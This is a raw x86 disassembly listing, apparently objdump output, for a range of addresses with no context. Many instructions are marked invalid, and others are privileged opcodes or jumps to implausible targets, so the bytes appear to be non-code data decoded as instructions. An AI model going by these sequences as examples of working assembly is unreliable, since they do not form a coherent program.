  428db7:	add    ecx,ecx
  428db9:	cmp    edi,edi
  428dbb:	pmuludq mm7,QWORD PTR [edx+0x50]
  428dbf:	(bad)  
  428dc0:	jmp    0x428d4d
  428dc2:	mov    edi,esp
  428dc4:	or     al,0xc6
  428dc6:	inc    ebp
  428dc7:	(bad)  
  428dc8:	mov    eax,DWORD PTR [ebp+0x10]
  428dcb:	jne    0x428d56
  428dcd:	mov    eax,DWORD PTR [ecx]
  428dcf:	clc    
  428dd0:	add    BYTE PTR [ebp-0x40],cl
  428dd3:	xor    edx,DWORD PTR [eax-0x73]
  428dd6:	jne    0x428dd9
  428dd8:	push   DWORD PTR [edx+0x8]
  428ddb:	add    BYTE PTR [ebp+0x45],al
  428dde:	mov    ebp,ecx
  428de0:	cld    
  428de1:	add    BYTE PTR [ebp+0x0],cl
  428de4:	xor    eax,DWORD PTR [ebp+0x3]
  428de7:	mov    al,0x3b
  428de9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428def:	sub    eax,0x5d330e4d
  428df4:	lea    esi,[ebx]
  428df6:	add    DWORD PTR [ebx],eax
  428df8:	jb     0x428de3
  428dfa:	add    BYTE PTR [eax],al
  428dfc:	inc    ebp
  428dfd:	add    bl,ch
  428dff:	inc    ebp
  428e00:	mov    esi,DWORD PTR [ebx]
  428e02:	or     al,0x3
  428e04:	(bad)  
  428e05:	mov    edi,eax
  428e07:	in     al,dx
  428e08:	scas   eax,DWORD PTR es:[edi]
  428e09:	inc    ebp
  428e0a:	mov    esi,DWORD PTR [ebx]
  428e0c:	in     al,0x3
  428e0e:	add    al,0x89
  428e10:	mov    ecx,DWORD PTR [eax+edi*8]
  428e13:	dec    ebp
  428e14:	(bad)  
  428e15:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428e1c:	mov    ecx,eax
  428e1e:	cld    
  428e1f:	push   es
  428e20:	dec    ebp
  428e21:	add    al,0x33
  428e23:	mov    DWORD PTR [ebx],eax
  428e25:	in     al,dx
  428e26:	cmp    DWORD PTR [ebp-0x67],eax
  428e29:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e2f:	mov    edx,DWORD PTR [ebp-0x4]
  428e32:	mov    ecx,DWORD PTR [ebp-0x18]
  428e35:	xor    ecx,DWORD PTR [ebp+0x3]
  428e38:	cmp    DWORD PTR [ebx],0x8b327497
  428e3e:	xor    edi,esp
  428e40:	jmp    0xff768b92
  428e45:	add    ecx,DWORD PTR [ebp-0x3f]
  428e48:	xor    ebx,DWORD PTR [edi]
  428e4a:	add    eax,ecx
  428e4c:	cmp    ebx,DWORD PTR [eax]
  428e4e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e51:	mov    ecx,DWORD PTR [eax]
  428e53:	adc    BYTE PTR [ebp-0x80],al
  428e56:	jmp    0x428e59
  428e58:	mov    eax,DWORD PTR [eax]
  428e5a:	cld    
  428e5b:	mov    bh,0xc6
  428e5d:	push   ecx
  428e5e:	(bad)  
  428e5f:	jne    0x428ebf
  428e61:	dec    ecx
  428e63:	or     BYTE PTR [ecx+ebx*1],cl
  428e66:	push   ebp
  428e67:	inc    ebp
  428e68:	in     al,dx
  428e69:	add    ebp,esp
  428e6b:	or     bh,al
  428e6d:	dec    ebp
  428e6e:	cld    
  428e6f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e75:	cmp    DWORD PTR [ecx],0x2
  428e78:	pushf  
  428e79:	dec    DWORD PTR [ebx+0x45510cf4]
  428e7f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e85:	mov    edx,DWORD PTR [ecx+0xc]
  428e88:	xor    eax,esi
  428e8a:	mov    edx,0xc172c7
  428e8f:	inc    ebp
  428e90:	mov    esi,DWORD PTR [ebp+0x8]
  428e93:	mov    eax,edx
  428e95:	call   0x84c7558a
  428e9a:	add    DWORD PTR [eax-0x76bace00],ebx
  428ea0:	mov    ebp,eax
  428ea2:	or     BYTE PTR [eax],dl
  428ea4:	jo     0x428ef3
  428ea6:	push   edi
  428ea7:	xor    esi,DWORD PTR [ebp+0x3]
  428eaa:	(bad)  
  428eab:	pmulhuw mm0,mm1
  428eae:	test   DWORD PTR [ebp-0x8],ecx
  428eb1:	mov    DWORD PTR [ebp-0x67],eax
  428eb4:	mov    eax,DWORD PTR [ebp-0x4]
  428eb7:	xor    edi,DWORD PTR [ebp-0x73]
  428eba:	xor    eax,DWORD PTR [ebx]
  428ebc:	xor    esi,DWORD PTR [edx+0x3]
  428ebf:	add    BYTE PTR [ecx],bh
  428ec1:	inc    ebp
  428ec2:	(bad)  
  428ec3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ec9:	mov    DWORD PTR [eax],0x750f0004
  428ecf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428ed5:	lock add BYTE PTR [ebp+0x0],al
  428ed9:	mov    esi,DWORD PTR [ebp-0x2c]
  428edc:	mov    ebp,edx
  428ede:	or     al,0x72
  428ee0:	ja     0x428ee2
  428ee2:	mov    edx,esi
  428ee4:	cld    
  428ee5:	(bad)  
  428ee8:	cli    
  428ee9:	mov    esi,DWORD PTR [ebp-0x4]
  428eec:	cmp    ecx,esi
  428eee:	bswap  edi
  428ef0:	(bad)
  428ef4:	mov    esi,DWORD PTR [ebp-0x4]
  428ef7:	mov    esi,ecx
  428ef9:	clc    
  428efa:	repnz add esi,DWORD PTR [ebp+0x45]
  428efe:	push   ebx
  428eff:	xor    eax,DWORD PTR [ebp+0x3]
  428f02:	cmp    ebx,DWORD PTR [edi-0x64]
  428f05:	pop    ebx
  428f06:	jmp    0x428fcd
  428f0b:	mov    esi,DWORD PTR [ebp-0x7d]
  428f0e:	xor    ebp,DWORD PTR [eax]
  428f10:	lea    eax,[ebp-0x8]
  428f13:	cmp    dl,dh
  428f15:	pushf  
  428f16:	out    dx,eax
  428f17:	(bad)  
  428f18:	neg    eax
  428f1a:	ins    DWORD PTR es:[edi],dx
  428f1b:	test   esi,edi
  428f1d:	clc    
  428f1e:	pop    esp
  428f1f:	inc    ebp
  428f20:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f26:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f2c:	add    cl,al
  428f2e:	jne    0x428ec8
  428f30:	mov    esi,DWORD PTR [edx]
  428f32:	in     al,dx
  428f33:	push   esi
  428f34:	xor    BYTE PTR [ebp-0xe],dh
  428f37:	add    edi,esi
  428f39:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f3f:	add    cl,bh
  428f41:	mov    edi,DWORD PTR [ebp+0x8]
  428f44:	mov    DWORD PTR [ebp-0x14],esi
  428f47:	add    esi,DWORD PTR [ebp+0x3c]
  428f4a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f50:	mov    ah,0x3d
  428f52:	cwde   
  428f53:	pushf  
  428f54:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f5a:	jne    0x428ee7
  428f5c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f5f:	icebp  
  428f60:	icebp  
  428f61:	shl    edx,0xf2
  428f64:	(bad)  
  428f65:	mov    ah,0x16
  428f67:	cmp    BYTE PTR [ebp-0x6d],dh
  428f6a:	mov    ecx,DWORD PTR [edi]
  428f6c:	in     al,dx
  428f6d:	jmp    0x428f60
  428f6f:	add    dl,dh
  428f71:	mov    edi,esi
  428f73:	or     al,0x8
  428f75:	inc    ebp
  428f76:	jne    0x428f7b
  428f78:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f7e:	ret    
  428f7f:	or     bh,bh
  428f81:	jge    0x428f6b
  428f83:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f89:	xor    edi,eax
  428f8b:	add    esi,DWORD PTR [ebp-0x77]
  428f8e:	mov    ebx,esp
  428f90:	clc    
  428f91:	neg    DWORD PTR [ebp-0x7c]
  428f94:	xor    eax,DWORD PTR [eax]
  428f96:	cmp    eax,DWORD PTR [eax]
  428f98:	repz jne 0x428f30
  428f9b:	xor    eax,DWORD PTR [ecx]
  428f9d:	add    ebx,DWORD PTR [eax]
  428f9f:	mov    DWORD PTR [ebp-0x8],eax
  428fa2:	mov    eax,edi
  428fa4:	cld    
  428fa5:	lock pop eax
  428fa7:	test   DWORD PTR [ebx],esi
  428fa9:	clc    
  428faa:	add    edx,DWORD PTR [edi-0x740bff77]
  428fb0:	fdivp  st(4),st
  428fb2:	test   ecx,esi
  428fb4:	(bad)  
  428fb5:	jnp    0x428fb6
  428fb7:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428fbd:	jae    0x428f4a
  428fbf:	sub    edi,esp
  428fc1:	(bad)  
  428fc2:	shl    DWORD PTR [eax-0x3e],0x89
  428fc6:	leave  
  428fc7:	call   0x819846d4
  428fcc:	in     al,dx
  428fcd:	(bad)  
  428fce:	in     al,dx
  428fcf:	add    bh,al
  428fd1:	mov    esp,edi
  428fd3:	in     al,dx
  428fd4:	test   DWORD PTR [ebp-0x8],edi
  428fd7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fda:	cmp    DWORD PTR [ebx],eax
  428fdc:	pushf  
  428fdd:	jnp    0x57318c16
  428fe3:	xor    edx,DWORD PTR [eax-0x77]
  428fe6:	push   ecx
  428fe7:	loopne 0x42901c
  428fe9:	jne    0x428fa6
  428feb:	mov    esi,DWORD PTR [edx-0x20]
  428fee:	add    BYTE PTR [ebp-0x3d],bh
  428ff1:	xor    eax,DWORD PTR [ebp-0x73]
  428ff4:	mov    edi,DWORD PTR [esi]
  428ff6:	cld    
  428ff7:	jb     0x428fbf
  428ff9:	add    bl,al
  428ffb:	jne    0x429042
  428ffd:	mov    edx,DWORD PTR [edi-0x10]
  429000:	jge    0x42907f
  429002:	mov    esi,DWORD PTR [ebx]
  429004:	lock add ecx,DWORD PTR [ebp+0x3b]
  429008:	xor    esi,DWORD PTR [ebp-0x77]
  42900b:	mov    esi,eax
  42900d:	lock inc ebp
  42900f:	jge    0x429049
  429011:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  429018:	dec    ebp
  429019:	mov    esi,DWORD PTR [ebx]
  42901b:	loopne 0x428fa6
  42901d:	jge    0x429017
  42901f:	add    DWORD PTR [ebp-0x7d],eax
  429022:	clc    
  429023:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42902a:	dec    ebp
  42902b:	hlt    
  42902c:	xor    ebx,DWORD PTR [ebp-0x77]
  42902f:	mov    esi,esp
  429031:	in     al,0x45
  429033:	jge    0x429071
  429035:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42903c:	dec    ebp
  42903d:	cmp    al,0x33
  42903f:	xchg   ebx,eax
  429040:	mov    DWORD PTR [ebx-0x14],esi
  429043:	add    eax,DWORD PTR [ebp-0xc]
  429046:	cmp    BYTE PTR [ebp-0x61],dh
  429049:	mov    edi,DWORD PTR [eax+0xf19504]
  42904f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429053:	cmp    eax,DWORD PTR [ebp+0xf]
  429056:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42905a:	fistp  WORD PTR [ebx+0x0]
  42905d:	inc    ebp
  42905e:	mov    ebx,DWORD PTR [edi+0xc]
  429061:	add    eax,eax
  429063:	inc    ebp
  429064:	test   BYTE PTR [ebx],dh
  429066:	add    eax,DWORD PTR [ebx]
  429068:	add    BYTE PTR [esi+0x45],bl
  42906b:	ret    0x85
  42906e:	jnp    0x5443143d
  429074:	inc    bp
  429076:	inc    ebp
  429077:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42907d:	fdiv   QWORD PTR [ebx]
  42907f:	test   DWORD PTR [ecx+0x453af8],edi
  429085:	push   ebx
  429086:	add    edi,DWORD PTR [esi+0x708088b]
  42908c:	cmp    esi,eax
  42908e:	sets   BYTE PTR [ecx-0x74fcffce]
  429095:	mov    esp,edi
  429097:	call   0x33cdd5e9
  42909c:	or     BYTE PTR [ebx],al
  42909e:	inc    ecx
  42909f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  4290a5:	and    BYTE PTR [ebp-0x7074f0bb],al
  4290ab:	lock add cl,al
  4290ae:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  4290b5:	mov    ch,0x45
  4290b7:	clc    
  4290b8:	xor    eax,DWORD PTR [ebp+0x3]
  4290bb:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290c1:	inc    ebp
  4290c2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290c8:	mov    edi,eax
  4290ca:	mov    eax,DWORD PTR [ebp+0x3c]
  4290cd:	mov    ecx,DWORD PTR [eax]
  4290cf:	hlt    
  4290d0:	inc    ebp
  4290d1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290d8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290de:	push   ebp
  4290df:	mov    edi,DWORD PTR [ebx]
  4290e1:	in     al,dx
  4290e2:	jne    0x4290a5
  4290e4:	mov    eax,DWORD PTR [ebp-0x28]
  4290e7:	add    DWORD PTR [eax],0xe8058dec
  4290ed:	clc    
  4290ee:	mov    esp,DWORD PTR [edi-0x8]
  4290f1:	add    dh,dl
  4290f3:	rol    WORD PTR [ebp-0x1],cl
  4290f7:	mov    edx,DWORD PTR [eax+0x8]
  4290fa:	jne    0x4290bc
  4290fc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  429103:	inc    ebp
  429104:	push   esp
  429105:	test   DWORD PTR [ecx+0xf],ecx
  429108:	sub    edx,esp
  42910a:	add    eax,DWORD PTR [eax]
  42910c:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  429112:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  429119:	mov    eax,DWORD PTR [ecx]
  42911b:	and    BYTE PTR [eax],al
  42911d:	adc    BYTE PTR ss:[eax],al
  429120:	inc    ebp
  429121:	inc    cx
  429124:	push   esp
  429125:	cld    
  429126:	jne    0x429128
  429128:	push   edx
  429129:	enterw 0xc1,0x4d
  42912e:	mov    esp,DWORD PTR [esi+0x20]
  429131:	add    DWORD PTR [ecx-0x7b],eax
  429134:	add    eax,DWORD PTR [ebx]
  429136:	str    WORD PTR [eax+0x45]
  42913a:	lea    ecx,[ebx+0x45890801]
  429140:	sbb    BYTE PTR [ebx],al
  429142:	dec    ebp
  429143:	cmp    al,0xf
  429145:	inc    ebp
  429146:	push   eax
  429147:	mov    esi,DWORD PTR [ebx]
  429149:	push   eax
  42914a:	add    eax,eax
  42914c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429153:	inc    ebp
  429154:	add    BYTE PTR [eax],bh
  429156:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42915d:	(bad)  
  42915e:	mov    ebx,eax
  429160:	loopne 0x4291a7
  429162:	dec    ebp
  429163:	mov    ecx,DWORD PTR [edi]
  429165:	cld    
  429166:	push   eax
  429167:	xchg   DWORD PTR [ebx],esi
  429169:	add    DWORD PTR [ebx],ebp
  42916b:	add    BYTE PTR [ebx],ch
  42916d:	or     BYTE PTR [ecx],bh
  42916f:	dec    ecx
  429170:	loopne 0x429175
  429172:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429178:	push   ebp
  429179:	add    DWORD PTR [ebx+0x55100800],eax
  42917f:	dec    ebp
  429180:	jmp    0x42910b
  429182:	mov    esp,DWORD PTR [eax]
  429184:	sbb    dl,dl
  429186:	inc    eax
  429187:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42918d:	add    BYTE PTR [ebx+0x74528555],cl
  429193:	push   ebp
  429194:	div    DWORD PTR [ebx]
  429196:	and    eax,DWORD PTR [ebx]
  429198:	add    edx,DWORD PTR [edx-0x30]
  42919b:	jno    0x429128
  42919d:	inc    DWORD PTR [eax+eiz*1]
  4291a0:	inc    ebp
  4291a1:	push   eax
  4291a2:	push   eax
  4291a3:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4291a9:	mov    edi,esp
  4291ab:	push   eax
  4291ac:	inc    ebp
  4291ad:	enter  0x458b,0x8
  4291b1:	push   ecx
  4291b2:	(bad)  
  4291b3:	call   0x10c9b8b
  4291b8:	pop    ss
  4291b9:	push   ebp
  4291ba:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291c0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291c6:	push   ecx
  4291c7:	jo     0x4291b1
  4291c9:	inc    DWORD PTR [edi]
  4291cb:	or     BYTE PTR [eax],al
  4291cd:	call   0xcd9917
  4291d2:	fmul   QWORD PTR [ebp+0x55]
  4291d5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291db:	mov    bh,0x8c
  4291dd:	adc    al,0x98
  4291df:	dec    esp
  4291e0:	xor    bl,BYTE PTR [eax]
  4291e2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291e5:	mov    eax,DWORD PTR [ebp-0x4]
  4291e8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ee:	push   es
  4291ef:	retf   
  4291f0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291f4:	inc    ebp
  4291f5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291fc:	retf   0x83fc
  4291ff:	into   
  429200:	dec    ebp
  429201:	retf   
  429202:	mov    ecx,DWORD PTR [ebp-0x74]
  429205:	mov    eax,DWORD PTR [eax]
  429207:	fdiv   QWORD PTR [ebx]
  429209:	mov    bh,0x3
  42920b:	push   es
  42920c:	mov    esi,ecx
  42920e:	sbb    cl,dl
  429210:	dec    ebp
  429211:	sar    DWORD PTR [ebx],cl
  429213:	push   ebp
  429214:	jne    0x429225
  429216:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  42921c:	lea    ebx,[eax]
  42921e:	call   0xf4cc1de5
  429223:	sbb    dh,dl
  429225:	add    edx,ebx
  429227:	push   ebp
  429228:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42922e:	push   ecx
  42922f:	mov    DWORD PTR [eax-0x30],edx
  429232:	test   DWORD PTR [edx],eax
  429234:	xadd   esp,esi
  429237:	pop    es
  429238:	add    cl,dl
  42923a:	mov    eax,ecx
  42923c:	or     al,0x45
  42923e:	(bad)  
  42923f:	push   eax
  429240:	add    DWORD PTR [edx+0x0],eax
  429243:	add    ecx,DWORD PTR [ecx]
  429245:	and    dh,cl
  429247:	call   0xc69b17
  42924c:	add    DWORD PTR [ebp+0x0],edx
  42924f:	mov    esp,DWORD PTR [ebp+0x18]
  429252:	add    BYTE PTR [eax+0x44],cl
  429255:	xor    eax,DWORD PTR [eax]
  429257:	add    esp,DWORD PTR [esi+0x3b]
  42925a:	inc    ebp
  42925b:	je     0x4291e0
  42925d:	push   ecx
  42925e:	or     cl,BYTE PTR [ebp-0x77]
  429261:	add    eax,esi
  429263:	or     al,0x5e
  429265:	inc    eax
  429266:	add    BYTE PTR [ebx],al
  429268:	data16 and BYTE PTR [ebp+0x50],al
  42926c:	sub    DWORD PTR [ecx],0xffffffe8
  42926f:	add    BYTE PTR [ebp-0x75],ah
  429272:	add    BYTE PTR [eax],bl
  429274:	enter  0x894d,0x8b
  429278:	int3   
  429279:	loopne 0x4292ad
  42927b:	rol    BYTE PTR [eax],0x33
  42927e:	lea    cx,[ebp+0xa]
  429282:	data16 jb 0x4292ca
  429285:	add    BYTE PTR [ebx+0x44890855],cl
  42928b:	sbb    ah,al
  42928d:	inc    ebp
  42928e:	lldt   WORD PTR ss:[edx+0x66]
  429293:	xor    ecx,DWORD PTR [eax]
  429295:	sub    edi,esp
  429297:	mov    eax,DWORD PTR [eax]
  429299:	or     al,0x66
  42929b:	ror    edx,cl
  42929d:	dec    ebp
  42929e:	inc    ebp
  42929f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  4292a5:	cld    
  4292a6:	or     BYTE PTR [edi+0x4501dd],dl
  4292ac:	(bad)  
  4292ad:	into   
  4292ae:	out    dx,al
  4292af:	retf   
  4292b0:	(bad)  
  4292b1:	dec    ebp
  4292b2:	mov    al,0x8b
  4292b4:	jmp    0xea27:0x450ac320
  4292bb:	xchg   esi,ebp
  4292bd:	add    edi,eax
  4292bf:	add    BYTE PTR [eax+0x3f52e955],bh
  4292c5:	push   ebp
  4292c6:	inc    ebp
  4292c7:	xor    ebx,esp
  4292c9:	add    ebp,esi
  4292cb:	push   edx
  4292cc:	push   bp
  4292ce:	inc    ebp
  4292cf:	(bad)  
  4292d0:	in     eax,dx
  4292d1:	push   esp
  4292d2:	(bad)  
  4292d3:	inc    edx
  4292d5:	sbb    al,0x33
  4292d7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292de:	add    BYTE PTR [ebp+0x43],0x8b
  4292e2:	jmp    0xf98b:0x100041c8
  4292e9:	xor    esi,DWORD PTR [edx+0x3]
  4292ec:	mov    ecx,DWORD PTR [edi]
  4292ee:	fmul   DWORD PTR [edx]
  4292f0:	add    BYTE PTR [eax],al
  4292f2:	lea    eax,[ebx-0x4700273c]
  4292f8:	add    al,0x4f
  4292fa:	pop    DWORD PTR [eax]
  4292fc:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  429302:	push   edx
  429303:	inc    WORD PTR [ebp+0x8]
  429307:	mov    eax,0x514f4d
  42930c:	(bad)
  429310:	add    al,al
  429312:	xor    DWORD PTR [ebx-0x74baf730],eax
  429318:	test   DWORD PTR [esi+0x74],esp
  42931b:	inc    ebp
  42931c:	mov    DWORD PTR [eax+0xa4f08],edi
  429322:	add    BYTE PTR [ecx-0x76c435bb],cl
  429328:	or     dh,cl
  42932a:	or     eax,0x8b8d5045
  42932f:	inc    ebp
  429330:	mov    WORD PTR [ecx+0x3b8a00],?
  429336:	jne    0x42936b
  429338:	mov    edi,DWORD PTR [edx+0x8f3a18]
  42933e:	add    DWORD PTR [ebx],eax
  429340:	add    bh,bh
  429342:	adc    DWORD PTR [eax],ecx
  429344:	adc    DWORD PTR [ebp+0x55],edi
  429347:	push   es
  429348:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  42934e:	mov    ebp,DWORD PTR [eax+ebp*1+0x50c211dc]
  429355:	inc    ebp
  429356:	mov    esp,edi
  429358:	or     al,0xdc
  42935a:	push   eax
  42935b:	(bad)  
  42935c:	jne    0x429312
  42935e:	call   0x3a8c4f
  429363:	inc    ebp
  429364:	rol    dl,0x84
  429367:	out    dx,al
  429368:	add    bh,al
  42936a:	add    BYTE PTR [ebp+esi*2-0x1c7424],bh
  429371:	(bad)  
  429372:	and    al,al
  429374:	fs in  eax,dx
  429376:	inc    DWORD PTR [ebp-0x7b]
  429379:	js     0x42938a
  42937b:	leave  
  42937c:	scas   al,BYTE PTR es:[edi]
  42937d:	inc    esp
  42937e:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  429385:	or     BYTE PTR [ebx-0x97717c5],0x83
  42938c:	call   DWORD PTR [edi]
  42938e:	shr    ah,0x84
  429391:	xchg   DWORD PTR [eax],eax
  429393:	add    DWORD PTR [eax],eax
  429395:	add    bh,bh
  429397:	dec    ebp
  429398:	and    BYTE PTR [ecx-0x38],dl
  42939b:	push   eax
  42939c:	dec    DWORD PTR [ebx+0xfd885]
  4293a2:	mov    BYTE PTR [ebp+0x508bac00],cl
  4293a8:	mov    WORD PTR [ecx+0x0],ss
  4293ab:	lea    ecx,[ebx+0x108b20d8]
  4293b1:	mov    WORD PTR [edx],ds
  4293b3:	add    BYTE PTR [edi+0xff01ff],al
  4293b9:	mov    ecx,DWORD PTR [ebp-0x28]
  4293bc:	push   ecx
  4293bd:	shl    BYTE PTR [ebp+0x3a],0x8b
  4293c1:	inc    ebp
  4293c2:	in     al,0xeb
  4293c4:	jno    0x429351
  4293c6:	push   edx
  4293c7:	mov    DWORD PTR [eax-0x28],edx
  4293ca:	mov    eax,DWORD PTR [ebp+0x20]
  4293cd:	je     0x429356
  4293cf:	mov    eax,DWORD PTR [ecx]
  4293d1:	sbb    BYTE PTR [eax],al
  4293d3:	pop    DWORD PTR [eax]
  4293d5:	add    esi,eax
  4293d7:	add    bl,al
  4293d9:	adc    DWORD PTR [edi],esi
  4293db:	jmp    0x8bcde42d
  4293e0:	sub    BYTE PTR [ebp+eax*2-0x63c4c800],cl
  4293e7:	jne    0x429374
  4293e9:	mov    ecx,DWORD PTR [eax]
  4293eb:	in     al,0x75
  4293ed:	pop    DWORD PTR [ecx+0x5001]
  4293f3:	push   edx
  4293f4:	inc    DWORD PTR [ebx]
  4293f6:	adc    BYTE PTR [ecx+0x45721cc6],cl
  4293fc:	add    BYTE PTR [edi+0x9],dl
  4293ff:	call   DWORD PTR [esi]
  429401:	and    dl,al
  429403:	and    bh,bh
  429405:	inc    edi
  429407:	test   eax,edx
  429409:	sldt   ebx
  42940c:	cmp    DWORD PTR [eax],eax
  42940e:	pushf  
  42940f:	(bad)  
  429410:	jmp    0x42941e
  429412:	mov    eax,edi
  429414:	or     al,0x75
  429416:	inc    eax
  429417:	call   0x428b1f
  42941c:	mov    eax,eax
  42941e:	loopne 0x4293a4
  429420:	inc    ebp
  429421:	add    BYTE PTR [ebx+0x1451c00],cl
  429427:	mov    eax,DWORD PTR [ebp+0x20]
  42942a:	add    edi,ecx
  42942c:	add    BYTE PTR [eax],ch
  42942e:	cmp    edi,0x18
  429431:	test   DWORD PTR [ebp+0xf],esi
  429434:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  42943b:	jne    0x42943f
  42943d:	call   0xffa18f02
  429442:	leave  
  429443:	rcr    BYTE PTR [esp+eax*4],0x55
  429447:	add    ah,ch
  429449:	add    BYTE PTR [edi-0x48fef979],dh
  42944f:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  429456:	inc    esp
  429457:	mov    ebx,DWORD PTR [eax]
  429459:	fcom   st(2)
  42945b:	add    BYTE PTR [edi],bl
  42945d:	lea    ecx,[eax-0x18]
  429460:	(bad)  
  429461:	push   DWORD PTR [ecx]
  429463:	call   0xffb4e1c5
  429468:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  42946c:	fstp   DWORD PTR [esi+ebx*8]
  42946f:	push   ebp
  429470:	pop    ebp
  429471:	mov    esi,DWORD PTR [edx-0x38]
  429474:	add    DWORD PTR [eax],0x28
  429477:	mov    edi,DWORD PTR [ebx]
  429479:	xor    esi,DWORD PTR [edx+0x3]
  42947c:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  429480:	pop    ebp
  429481:	or     al,0x4
  429483:	inc    ecx
  429484:	push   ebp
  429485:	(bad)  
  429486:	in     al,dx
  429487:	or     ah,ch
  429489:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42948a:	xbegin 0xffc80a80
  429490:	clc    
  429491:	adc    al,0x45
  429493:	idiv   BYTE PTR [ecx]
  429495:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  42949c:	test   DWORD PTR [eax+0x665300f8],ebx
  4294a2:	add    BYTE PTR [ecx+0x66],dh
  4294a5:	add    eax,DWORD PTR [ebp+0x52]
  4294a8:	adc    eax,0x20
  4294ab:	xchg   DWORD PTR [ecx+0x4800fc01],ecx
  4294b1:	test   DWORD PTR [eax],eax
  4294b3:	clc    
  4294b4:	data16 or al,BYTE PTR [ebp+0x45]
  4294b8:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  4294bf:	rol    BYTE PTR [ebp+0x45],1
  4294c2:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  4294c8:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  4294ce:	push   ebx
  4294cf:	add    BYTE PTR [eax+0x0],dl
  4294d2:	push   ecx
  4294d3:	jge    0x429508
  4294d5:	add    BYTE PTR [esi+0x4],dl
  4294d8:	jne    0x42953f
  4294da:	mov    edx,0x457200
  4294df:	jmp    0x4294a3
  4294e1:	xor    edi,DWORD PTR [ebx]
  4294e3:	pop    edi
  4294e4:	cvtdq2ps xmm7,xmm0
  4294e7:	ret    0x0
  4294ea:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  4294f0:	xor    ecx,DWORD PTR [edi]
  4294f2:	add    eax,DWORD PTR [ecx+0x3b]
  4294f5:	push   ebx
  4294f6:	rdpmc  
  4294f8:	out    0x8d,al
  4294fa:	add    BYTE PTR [eax],cl
  4294fc:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  429502:	ret    0x450c
  429505:	sbb    al,0x8b
  429507:	cmp    eax,esi
  429509:	or     cl,al
  42950b:	or     al,0xc2
  42950d:	pop    eax
  42950e:	inc    ebp
  42950f:	add    ecx,DWORD PTR [edi]
  429511:	add    esi,DWORD PTR [ebp+0x39]
  429514:	invd   
  429516:	jge    0x429522
  429518:	mov    eax,0x478ac0
  42951d:	cli    
  42951e:	xor    esp,ecx
  429520:	mov    ebx,0x5b8ac0
  429525:	ret    0x33
  429528:	mov    eax,0x833a8b
  42952d:	sub    BYTE PTR [ebx],al
  42952f:	inc    ebp
  429530:	data16 cmp al,bh
  429533:	pushf  
  429534:	inc    bh
  429536:	mov    esp,esp
  429538:	hlt    
  429539:	test   DWORD PTR [ebp-0x8],esi
  42953c:	mov    eax,DWORD PTR [ebp-0x14]
  42953f:	cmp    cl,BYTE PTR [ebx-0x76478864]
  429545:	dec    edi
  429546:	or     BYTE PTR [eax],al
  429548:	jne    0x4294d3
  42954a:	mov    esi,esp
  42954c:	call   0x77a92111
  429551:	inc    ebp
  429552:	mov    DWORD PTR [eax+0x984f0c],edi
  429558:	add    BYTE PTR [ecx-0x3ffe0717],cl
  42955e:	add    BYTE PTR [esi+0x7d],ah
  429561:	inc    ebp
  429562:	mov    bx,WORD PTR [ebp+0x8]
  429566:	add    DWORD PTR [ebp+0x50],0x30c008b
  42956d:	inc    ebp
  42956e:	mov    bx,di
